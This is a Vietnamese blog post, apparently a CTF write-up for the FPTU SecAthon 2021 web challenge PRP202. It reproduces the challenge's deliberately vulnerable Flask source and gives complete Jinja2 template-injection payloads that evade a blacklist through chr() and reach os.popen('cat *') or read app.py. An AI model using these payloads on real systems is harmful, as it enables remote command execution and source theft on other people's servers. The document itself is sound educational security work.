<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>phucdc's Blog</title>
<link
    rel="stylesheet"
    href="/assets/css/styles.css"
/>



<link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon/favicon-16x16.png">
<link rel="mask-icon" href="/assets/favicon/safari-pinned-tab.svg" color="#5bbad5">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff">



<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
<link
  rel="stylesheet"
  href="https://cdn.rawgit.com/afeld/bootstrap-toc/v1.0.1/dist/bootstrap-toc.min.css"
/>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

<script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
<script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js" integrity="sha512-IsNh5E3eYy3tr/JiX2Yx4vsCujtkhwl7SLqgnwLNgf04Hrt9BT9SXlLlZlWx+OK4ndzAoALhsMNcCmkggjZB1w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
</head>
<body>
    <div class="container-fluid">
        <div class="row">
            <div class="col-md-2 bg-dark vh-100 sticky-top sidebar text-center">
    <div class="avatar">
        <img id="avatar" src="/assets/avatar.png" class="rounded-circle" alt="">
    </div> <br>
    <h3 class="text-white text-center">phucdc's Blog</h3>
    <hr class="text-white">
    <div class="nav">
        <ul>
            
           <li class="nav-item">
                <a href="/"><i class="bi bi-house"></i>Home</a>
           </li> 
           
           <li class="nav-item">
                <a href="/about/"><i class="bi bi-info-square"></i>About</a>
           </li> 
           
        </ul>
    </div>
    <div class="nav contact">
        <ul>
            
            <li class="nav-item">
                <a href="https://github.com/phucdc-noob">
                    <i class="bi bi-github"></i>
                </a>
            </li>
            
            <li class="nav-item">
                <a href="https://twitter.com/PhucdcN">
                    <i class="bi bi-twitter"></i>
                </a>
            </li>
            
            <li class="nav-item">
                <a href="https://www.facebook.com/phuc.duongcong5545/">
                    <i class="bi bi-facebook"></i>
                </a>
            </li>
            
            <li class="nav-item">
                <a href="mailto:phucbontu1012@gmail.com">
                    <i class="bi bi-envelope"></i>
                </a>
            </li>
            
        </ul>
    </div>
</div>


    

            <div class="main col-md-8" id="main">
                <div class="post" id="post">
    <h1>FPTU SecAthon 2021 | Web Writeup | PRP202</h1>
    <span>Oct 13, 21</span>
    <hr>
    <div id="post-content"><h1 id="prp202">PRP202</h1>

<blockquote>
  <p>Một bài hay và cực khó với mình, chả trách người anh T giấu tên cứ bảo làm thử<br />
2 ngày để làm, nhiều lần thất bại, nhưng kết quả thật xứng đáng</p>
</blockquote>

<h2 id="source-code-and-analysis">Source code and analysis</h2>

<h3 id="source-code">Source code</h3>
<p>Bắt đầu vào bài, tại trang index, Ctrl U lên thấy <a href="https://github.com/phucdc-noob/FUSec-Write-Ups/blob/main/PRP202.py">source code</a> Flask của web</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">,</span> <span class="n">template_folder</span><span class="o">=</span><span class="s">"template"</span><span class="p">)</span>
<span class="n">SESSION_TYPE</span> <span class="o">=</span> <span class="s">"filesystem"</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">.</span><span class="n">from_object</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
<span class="n">Session</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
<span class="n">authCode</span> <span class="o">=</span> <span class="s">"C4n 1 Trust Y0u? Player "</span>


<span class="c1"># Our bot detected that some users had gained access to the system by malicious function, so we decided to ban it.
</span><span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s">"'"</span><span class="p">,</span> <span class="s">'"'</span><span class="p">,</span> <span class="s">"request"</span><span class="p">,</span> <span class="s">"readlines"</span><span class="p">,</span> <span class="s">"+"</span><span class="p">,</span> <span class="s">"%2b"</span><span class="p">,</span> <span class="s">"%22"</span><span class="p">,</span> <span class="s">"%27"</span><span class="p">,</span> <span class="s">"linecache"</span><span class="p">]</span>


<span class="k">def</span> <span class="nf">authCheck</span><span class="p">(</span><span class="nb">input</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="nb">input</span><span class="p">)</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">""</span>
    <span class="k">return</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="nb">input</span><span class="p">)</span>


<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"GET"</span><span class="p">,</span> <span class="s">"POST"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">session</span><span class="p">.</span><span class="n">pop</span><span class="p">(</span><span class="s">"userCode"</span><span class="p">)</span>
        <span class="n">session</span><span class="p">.</span><span class="n">pop</span><span class="p">(</span><span class="s">"winner"</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">"POST"</span><span class="p">:</span>
        <span class="n">ok</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">"ok"</span><span class="p">]</span>
        <span class="k">for</span> <span class="n">ban</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">ban</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">"name"</span><span class="p">]:</span>
                <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="s">"Hacker Alert!!!"</span><span class="p">)</span>
        <span class="n">session</span><span class="p">[</span><span class="s">"userCode"</span><span class="p">]</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">"name"</span><span class="p">]</span>
        <span class="k">if</span> <span class="n">ok</span> <span class="o">==</span> <span class="s">"Let's play!"</span><span class="p">:</span>
            <span class="n">session</span><span class="p">[</span><span class="s">"check"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"access"</span>
            <span class="c1"># bypass this? No way haha :D
</span>            <span class="n">winner</span> <span class="o">=</span> <span class="s">"cocailonditconbamay"</span>
            <span class="n">session</span><span class="p">[</span><span class="s">"winner"</span><span class="p">]</span> <span class="o">=</span> <span class="n">winner</span>
            <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span>
                <span class="s">"Generating winner hash...&lt;script&gt;setInterval(function(){ window.location='/doanxem'; }, 500);&lt;/script&gt;"</span>
            <span class="p">)</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"index.html"</span><span class="p">)</span>


<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/doanxem"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"GET"</span><span class="p">,</span> <span class="s">"POST"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">doanxem</span><span class="p">():</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">authCheck</span><span class="p">(</span><span class="s">"check"</span><span class="p">)</span> <span class="o">==</span> <span class="s">""</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">authCode</span> <span class="o">+</span> <span class="n">authCheck</span><span class="p">(</span><span class="s">"userCode"</span><span class="p">))</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">"POST"</span><span class="p">:</span>
                <span class="n">winner_input</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">"winner"</span><span class="p">]</span>
                <span class="k">if</span> <span class="n">winner_input</span> <span class="o">==</span> <span class="n">authCheck</span><span class="p">(</span><span class="s">"winner"</span><span class="p">):</span>
                    <span class="n">mess</span> <span class="o">=</span> <span class="p">(</span>
                        <span class="s">"You are the real winner!!!!!!!!!! "</span>
                        <span class="o">+</span> <span class="n">authCheck</span><span class="p">(</span><span class="s">"userCode"</span><span class="p">)</span>
                        <span class="o">+</span> <span class="s">", here your flag: https://youtu.be/dQw4w9WgXcQ"</span>
                    <span class="p">)</span>
                <span class="k">elif</span> <span class="n">winner_input</span> <span class="o">!=</span> <span class="n">authCheck</span><span class="p">(</span><span class="s">"winner"</span><span class="p">):</span>
                    <span class="n">mess</span> <span class="o">=</span> <span class="s">"Wrong! You die!&lt;script&gt;setInterval(function(){ window.location='/choilai'; }, 1200);&lt;/script&gt;"</span>
                <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">mess</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"doanxem.html"</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">authCode</span> <span class="o">+</span> <span class="n">authCheck</span><span class="p">(</span><span class="s">"userCode"</span><span class="p">))</span>


<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/choilai"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">reset_access</span><span class="p">():</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">session</span><span class="p">.</span><span class="n">pop</span><span class="p">(</span><span class="s">"check"</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span>
            <span class="s">"You got an Extra Change. Gud luck :D!!!!!!&lt;script&gt;setInterval(function(){ window.location='/'; }, 500);&lt;/script&gt;"</span>
        <span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">authCode</span> <span class="o">+</span> <span class="n">authCheck</span><span class="p">(</span><span class="s">"userCode"</span><span class="p">))</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">app</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="s">"###########"</span>
    <span class="n">serve</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s">"0.0.0.0"</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8900</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="analysis">Analysis</h3>

<p>Có <code class="language-plaintext highlighter-rouge">render_template_string()</code> nên rất dễ đoán đây là <a href="https://portswigger.net/research/server-side-template-injection">SSTI</a></p>

<p>Nhưng vì đã bị chặn <code class="language-plaintext highlighter-rouge">request.args</code> nên chắc phải inject từ một input nào đó :v</p>

<p>Review lại source code thì ta thấy có 2 chỗ <code class="language-plaintext highlighter-rouge">render_template_string()</code> cần sử dụng <code class="language-plaintext highlighter-rouge">authCheck("userCode")</code>, chính là cái tên ta nhập ở index</p>

<p>Ở <code class="language-plaintext highlighter-rouge">doanxem()</code> ta thấy <code class="language-plaintext highlighter-rouge">mess</code> là một đoạn code chuyển hướng sang <code class="language-plaintext highlighter-rouge">/choilai</code></p>

<p>Sang đến <code class="language-plaintext highlighter-rouge">choilai()</code> thì ta thấy rằng nó sẽ <code class="language-plaintext highlighter-rouge">pop</code> cái mục <code class="language-plaintext highlighter-rouge">check</code> của session data, vậy câu hỏi ở đây là, nếu như ta để cho <code class="language-plaintext highlighter-rouge">doanxem</code> gửi một request sang <code class="language-plaintext highlighter-rouge">/choilai</code>, nhưng trước khi <code class="language-plaintext highlighter-rouge">/choilai</code> kịp render, ta drop cái request đó? Tất nhiên cái <code class="language-plaintext highlighter-rouge">session.pop("check")</code> vẫn được thực thi, nhưng không render. Và nếu ta gửi tiếp một request của <code class="language-plaintext highlighter-rouge">doanxem</code> vào <code class="language-plaintext highlighter-rouge">/choilai</code>, điều gì sẽ xảy ra? <code class="language-plaintext highlighter-rouge">session.pop()</code> sẽ lỗi vì đã pop trước đó, nên giờ không còn gì mà pop, và thay vì render ra chuyển hướng về index, thì đoạn render cuối sẽ được thực thi.</p>

<p>Đã rõ cách để trigger template, thử nhập <code class="language-plaintext highlighter-rouge">{{7*7}}</code> ở index và làm các bước như trên:</p>

<p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP202_1.png" alt="7*7" /></p>

<h2 id="exploit">Exploit</h2>

<p>Vậy là đã rõ, bây giờ việc cần làm là tạo ra payload, trước tiên, hãy review cái black list của source code đã:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s">"'"</span><span class="p">,</span> <span class="s">'"'</span><span class="p">,</span> <span class="s">"request"</span><span class="p">,</span> <span class="s">"readlines"</span><span class="p">,</span> <span class="s">"+"</span><span class="p">,</span> <span class="s">"%2b"</span><span class="p">,</span> <span class="s">"%22"</span><span class="p">,</span> <span class="s">"%27"</span><span class="p">,</span> <span class="s">"linecache"</span><span class="p">]</span>
</code></pre></div></div>

<p>Đoạn này khá là khó, vì black list chứa những kí tự và từ khóa phổ biến để tạo payload SSTI</p>

<p>Suy nghĩ mãi làm thế nào để tạo payload thì người anh TungDLM bảo <code class="language-plaintext highlighter-rouge">chr</code>, sáng dạ thêm một tí</p>

<p>Cụ thể thì ta sẽ dùng <code class="language-plaintext highlighter-rouge">chr()</code> để tạo các kí tự trong string và ghép chúng lại, nhưng trước tiên, phải define nó</p>

<p>Thử nhập <code class="language-plaintext highlighter-rouge">().__class__.__base__.__subclasses__()</code> để list các subclass và mình thấy, tại vị trí 80 có <code class="language-plaintext highlighter-rouge">&lt;class '_frozen_importlib._ModuleLock'&gt;</code>, có thể sử dụng nó để define <code class="language-plaintext highlighter-rouge">chr</code>:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="p">().</span><span class="n">__class</span><span class="p">.</span><span class="n">__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">80</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nb">chr</span> <span class="o">%</span><span class="p">}</span>
</code></pre></div></div>

<p>Đoạn này phải cảm ơn 3 chữ <code class="language-plaintext highlighter-rouge">s e t</code> của anh TaiDH, một pro đã giải bài này trong 15 phút, trước cả mình</p>

<p>Ok, để đoạn define ở đó, bây giờ đến đoạn payload chính, có rất nhiều hướng làm:</p>

<h3 id="sử-dụng-cycler-__doc__-và-replace-tungdlm">Sử dụng <code class="language-plaintext highlighter-rouge">cycler</code>, <code class="language-plaintext highlighter-rouge">__doc__</code> và <code class="language-plaintext highlighter-rouge">replace</code> (TungDLM):</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span><span class="n">cycler</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(().</span><span class="n">__doc__</span><span class="p">[</span><span class="mi">36</span><span class="p">:</span><span class="mi">41</span><span class="p">].</span><span class="n">replace</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">),</span><span class="nb">chr</span><span class="p">(</span><span class="mi">99</span><span class="p">)).</span><span class="n">replace</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">114</span><span class="p">),</span><span class="nb">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">)).</span><span class="n">replace</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">103</span><span class="p">),</span><span class="nb">chr</span><span class="p">(</span><span class="mi">116</span><span class="p">)).</span><span class="n">replace</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">117</span><span class="p">),</span><span class="nb">chr</span><span class="p">(</span><span class="mi">32</span><span class="p">)).</span><span class="n">replace</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">109</span><span class="p">),</span><span class="nb">chr</span><span class="p">(</span><span class="mi">42</span><span class="p">))).</span><span class="n">read</span><span class="p">()}}</span>
</code></pre></div></div>

<p>Dễ hiểu là, chúng ta sẽ lợi dụng đoạn <code class="language-plaintext highlighter-rouge">__doc__</code> của <code class="language-plaintext highlighter-rouge">Tuple</code>, ví <code class="language-plaintext highlighter-rouge">__doc__</code> là một String nên ta chỉ việc cắt một đoạn của nó ra, <code class="language-plaintext highlighter-rouge">replace()</code> để thay thế các kí tự, sử dụng <code class="language-plaintext highlighter-rouge">chr()</code> để thay cho việc dùng <code class="language-plaintext highlighter-rouge">''/""</code>. Nhờ đó tạo được câu lệnh để <code class="language-plaintext highlighter-rouge">os.open()</code> thực thi (<code class="language-plaintext highlighter-rouge">cat *</code>) và in ra tại <code class="language-plaintext highlighter-rouge">read()</code></p>

<p>Payload hoàn chỉnh:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="nb">chr</span> <span class="o">=</span> <span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">80</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nb">chr</span> <span class="o">%</span><span class="p">}{{</span><span class="n">cycler</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(().</span><span class="n">__doc__</span><span class="p">[</span><span class="mi">36</span><span class="p">:</span><span class="mi">41</span><span class="p">].</span><span class="n">replace</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">),</span><span class="nb">chr</span><span class="p">(</span><span class="mi">99</span><span class="p">)).</span><span class="n">replace</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">114</span><span class="p">),</span><span class="nb">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">)).</span><span class="n">replace</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">103</span><span class="p">),</span><span class="nb">chr</span><span class="p">(</span><span class="mi">116</span><span class="p">)).</span><span class="n">replace</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">117</span><span class="p">),</span><span class="nb">chr</span><span class="p">(</span><span class="mi">32</span><span class="p">)).</span><span class="n">replace</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">109</span><span class="p">),</span><span class="nb">chr</span><span class="p">(</span><span class="mi">42</span><span class="p">)))}}</span>
</code></pre></div></div>

<h3 id="sử-dụng-__add__-by-me">Sử dụng <code class="language-plaintext highlighter-rouge">__add__</code> (by me):</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">80</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">).</span><span class="n">__add__</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">112</span><span class="p">).</span><span class="n">__add__</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">112</span><span class="p">).</span><span class="n">__add__</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">46</span><span class="p">).</span><span class="n">__add__</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">112</span><span class="p">).</span><span class="n">__add__</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">121</span><span class="p">)))))))}}</span>
</code></pre></div></div>

<p>Tại đây mình sử dụng <code class="language-plaintext highlighter-rouge">__add__</code> để nối các kí tự thành chuỗi và <code class="language-plaintext highlighter-rouge">open()</code> để mở file, không khuyến khích làm theo, khổ dâm lắm :’(</p>

<p>Payload hoàn chỉnh:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="nb">chr</span> <span class="o">=</span> <span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">80</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nb">chr</span> <span class="o">%</span><span class="p">}{{().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">80</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">).</span><span class="n">__add__</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">112</span><span class="p">).</span><span class="n">__add__</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">112</span><span class="p">).</span><span class="n">__add__</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">46</span><span class="p">).</span><span class="n">__add__</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">112</span><span class="p">).</span><span class="n">__add__</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">121</span><span class="p">)))))))}}</span>
</code></pre></div></div>

<h2 id="flag">Flag:</h2>

<p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP202_2.png" alt="flag" /></p>

<p>Flag: <code class="language-plaintext highlighter-rouge">FUSEC{@@@@@@Th3_n3Xt_l3v3l_pL4y!!!!!!!!}</code></p>

<blockquote>
  <p>Rất có thể có nhiều cách khác, vì anh TungDLM đã để nhả</p>
</blockquote>

<blockquote>
  <p>Cảm ơn anh TungDLM và anh TaiDH đã hỗ trợ trong quá trình giải bài này</p>
</blockquote>

<h2 id="references">References:</h2>

<ul>
  <li>
    <p><a href="https://doantung99.medium.com/fpt-night-wolf-ctf-writeup-de43925ed84b">https://doantung99.medium.com/fpt-night-wolf-ctf-writeup-de43925ed84b</a>, WU của anh TungDLM trong giải NightWolf-CTF do SAS tổ chức, trong đó có bài XSMB, cùng SSTI tương tự, tại bài đó, anh Tùng có đính kèm 2 link tham khảo</p>
  </li>
  <li>
    <p><a href="https://chowdera.com/2020/12/20201221231521371q.html">https://chowdera.com/2020/12/20201221231521371q.html</a>, đây là bài viết mình tham khảo rất rất nhiều, chi tiết và có thêm 3 đoạn code viết bằng python giúp tìm vị trí các class dễ hơn, một số trick bypass filter, nên tham khảo</p>
  </li>
  <li>
    <p><a href="https://portswigger.net/research/server-side-template-injection">https://portswigger.net/research/server-side-template-injection</a>, đây là bài viết của Jame Kettle về SSTI, nếu nhớ không nhầm chính ông này nghiên cứu ra SSTI, nên đọc nếu chưa biết nhiều về SSTI</p>
  </li>
</ul>

</div>
</div>
<script>
    var imgEl = document.getElementsByTagName('img');
    for (var i=0; i<imgEl.length; i++) {
        if (imgEl[i].getAttribute('src') && imgEl[i].id != 'avatar') {
        imgEl[i].setAttribute('data-src',imgEl[i].getAttribute('src'));
        imgEl[i].removeAttribute('src'); //use only if you need to remove data-src attribute after setting src
        }
    }
    $(function() {

        const IMG_SCOPE = '.main .post';
      
        if ($(`${IMG_SCOPE} img`).length <= 0 ) {
          return;
        }
      
        /* lazy loading */
      
        const imgList = document.querySelectorAll(`${IMG_SCOPE} img[data-src]`);
        const observer = lozad(imgList);
        observer.observe();
      
        /* popup */
      
        $(`${IMG_SCOPE} p > img[data-src],${IMG_SCOPE} img[data-src].preview-img`).each(
          function() {
            let nextTag = $(this).next();
            const title = nextTag.prop('tagName') === 'EM' ? nextTag.text() : '';
            const src = $(this).attr('data-src'); // created by lozad.js
      
            $(this).wrap(`<a href="${src}" title="${title}" class="popup"></a>`);
          }
        );
      
        $('.popup').magnificPopup({
          type: 'image',
          closeOnContentClick: true,
          showCloseBtn: false,
          zoom: {
            enabled: true,
            duration: 300,
            easing: 'ease-in-out'
          }
        });
      
        /* markup the image links */
      
        $(`${IMG_SCOPE} a`).has('img').addClass('img-link');
      
      });
</script>
            </div>
            




<div class="col-md-2 bg-black vh-100 sticky-top toc-container" > 
  <span class="text-white">Content</span><br><br>
  <div id="toc">

  </div>
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.min.js"></script>
<script>
  tocbot.init({
    // Where to render the table of contents.
    tocSelector: '#toc',
    // Where to grab the headings to build the table of contents.
    contentSelector: '#post-content',
    // Which headings to grab inside of the contentSelector element.
    headingSelector: 'h2, h3, h4, h5, h6',
    // For headings inside relative or absolute positioned containers within content.
    hasInnerContainers: true,
  });
</script>


        </div>
    </div>
    <script type="text/x-mathjax-config">
        MathJax.Hub.Config({
          tex2jax: {
            inlineMath: [['$','$'], ['\\(','\\)']],
            processEscapes: true
          }
        });
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>
</body>
</html>


